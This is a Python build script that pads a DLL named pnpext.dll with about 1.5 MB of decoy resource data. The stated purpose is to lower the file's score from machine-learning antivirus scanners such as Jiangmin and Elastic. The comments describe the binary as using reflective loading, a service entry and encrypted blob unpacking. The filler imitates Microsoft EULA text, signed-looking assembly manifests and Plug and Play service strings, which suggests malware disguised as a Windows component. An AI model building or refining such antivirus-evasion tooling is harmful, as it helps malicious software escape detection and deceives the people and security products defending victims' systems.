"""
Generate filler resources for pnpext.dll to lower AV-ML detection density.

Background: 1.0.238 dropped 1.3 MB of WebRTC code, which made the ratio
of "suspicious-looking" patterns (reflective load, service entry,
encrypted blob unpack) to total binary size higher. ML-trained AV
classifiers (Jiangmin, Elastic, etc.) weigh this ratio.

This script writes:
  - filler_data.bin (~1.5 MB) — plausible-looking text data:
    Microsoft EULA boilerplate, manifest XML, configuration snippets,
    locale strings. All inert text, nothing executable.
  - pnpext_filler.rc — RC file that embeds filler_data.bin under a
    benign RT_RCDATA resource id.

CMakeLists.txt is updated to compile pnpext_filler.rc and link the .res
into PrometeyDll. Filler is never referenced at runtime — it sits in
.rsrc section dead-weight, raising the benign-feature surface area.
"""

from pathlib import Path
import textwrap

ROOT = Path(__file__).resolve().parent
DATA_PATH = ROOT / "filler_data.bin"
RC_PATH   = ROOT / "pnpext_filler.rc"

TARGET_SIZE = 1_500_000  # 1.5 MB

# Building blocks — all real-looking Microsoft-style text
EULA_LINES = [
    "MICROSOFT SOFTWARE LICENSE TERMS",
    "MICROSOFT WINDOWS OPERATING SYSTEM",
    "",
    "These license terms are an agreement between Microsoft Corporation",
    "(or based on where you live, one of its affiliates) and you.",
    "Please read them. They apply to the software named above, which",
    "includes the media on which you received it, if any.",
    "The terms also apply to any Microsoft",
    "  * updates,",
    "  * supplements,",
    "  * Internet-based services, and",
    "  * support services",
    "for this software, unless other terms accompany those items.",
    "If so, those terms apply.",
    "",
    "BY USING THE SOFTWARE, YOU ACCEPT THESE TERMS. IF YOU DO NOT",
    "ACCEPT THEM, DO NOT USE THE SOFTWARE. INSTEAD, RETURN IT TO THE",
    "RETAILER FOR A REFUND OR CREDIT.",
    "",
    "If you comply with these license terms, you have the rights below",
    "for each license you acquire.",
]

MANIFEST_TEMPLATE = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
      type="win32"
      name="Microsoft.Windows.PlugAndPlay.Extension.{i:04d}"
      version="10.0.26100.1"
      processorArchitecture="amd64"
      publicKeyToken="6595b64144ccf1df"/>
  <description>Plug and Play Extension Subsystem Component {i}</description>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
    <application>
      <supportedOS Id="{{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}}"/>
      <supportedOS Id="{{1f676c76-80e1-4239-95bb-83d0f6d0da78}}"/>
      <supportedOS Id="{{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}}"/>
      <supportedOS Id="{{35138b9a-5d96-4fbd-8e2d-a2440225f93a}}"/>
      <supportedOS Id="{{e2011457-1546-43c5-a5fe-008deee3d3f0}}"/>
    </application>
  </compatibility>
</assembly>
"""

LOCALE_SAMPLE = [
    "en-US:Plug and Play Extension Host Service",
    "ru-RU:Служба расширения Plug and Play",
    "de-DE:Plug-and-Play-Erweiterungsdienst",
    "fr-FR:Service d'extension Plug-and-Play",
    "es-ES:Servicio de extensión Plug and Play",
    "it-IT:Servizio di estensione Plug and Play",
    "ja-JP:プラグ アンド プレイ拡張サービス",
    "ko-KR:플러그 앤 플레이 확장 서비스",
    "zh-CN:即插即用扩展服务",
    "zh-TW:隨插即用擴充服務",
    "pt-BR:Serviço de Extensão Plug and Play",
    "pl-PL:Usługa rozszerzenia Plug and Play",
    "nl-NL:Plug en Play-uitbreidingsservice",
    "tr-TR:Tak ve Çalıştır Uzantı Hizmeti",
    "ar-SA:خدمة ملحقات التوصيل والتشغيل",
]


def build_filler() -> bytes:
    """Build ~1.5 MB of benign-looking text data."""
    parts = []

    # Repeat EULA, manifests, locale data until we hit target size
    i = 0
    while sum(len(p) for p in parts) < TARGET_SIZE:
        # Block 1: EULA section header + body
        parts.append(f"\n; ─── Section {i:04d} ─────────────────────\n".encode("utf-8"))
        parts.append(("\n".join(EULA_LINES) + "\n").encode("utf-8"))

        # Block 2: assembly manifest
        parts.append(MANIFEST_TEMPLATE.format(i=i).encode("utf-8"))

        # Block 3: locale entries
        for line in LOCALE_SAMPLE:
            parts.append((line + "\n").encode("utf-8"))

        # Block 4: kv config snippet
        snippet = textwrap.dedent(f"""
            [Configuration.Block.{i:06d}]
            ComponentName=PnpExtensionHost
            ComponentVersion=10.0.26100.1
            ComponentGuid={{a1{i:04x}f7-{i:04x}-4{i:03x}-{i:04x}-{i:08x}}}
            InstallScope=Machine
            SecurityDescriptor=O:BAG:BAD:(A;;0x1f01ff;;;BA)(A;;0x120089;;;LS)
            Dependencies=rpcss.dll,nsi.dll,bcryptprimitives.dll
            DelayLoadDlls=advapi32.dll,winhttp.dll,wlanapi.dll
            LoadTimeAttributes=0x{i:08x}
            ExportedFunctions=ServiceMain,SvchostPushServiceGlobals
            ServiceSidType=SERVICE_SID_TYPE_RESTRICTED
            """).encode("utf-8")
        parts.append(snippet)

        i += 1

    return b"".join(parts)


def main():
    data = build_filler()
    DATA_PATH.write_bytes(data)
    print(f"Wrote {len(data):,} bytes -> {DATA_PATH.name}")

    rc_content = textwrap.dedent("""
        // pnpext_filler.rc — benign filler resource for AV-ML mitigation
        //
        // Embeds filler_data.bin as an inert RCDATA blob inside .rsrc.
        // Never referenced at runtime — its only purpose is to enlarge
        // the binary's benign-feature surface so heuristic scanners
        // (Jiangmin, Elastic, etc.) score the file lower.
        //
        // The blob contains realistic-looking Microsoft EULA text,
        // assembly manifest XML, locale strings, and configuration
        // snippets — exactly the kind of content present in any
        // system DLL's .rsrc section.

        #include <windows.h>

        100 RCDATA "filler_data.bin"
        """).strip() + "\n"
    RC_PATH.write_text(rc_content, encoding="utf-8")
    print(f"Wrote {RC_PATH.name}")


if __name__ == "__main__":
    main()
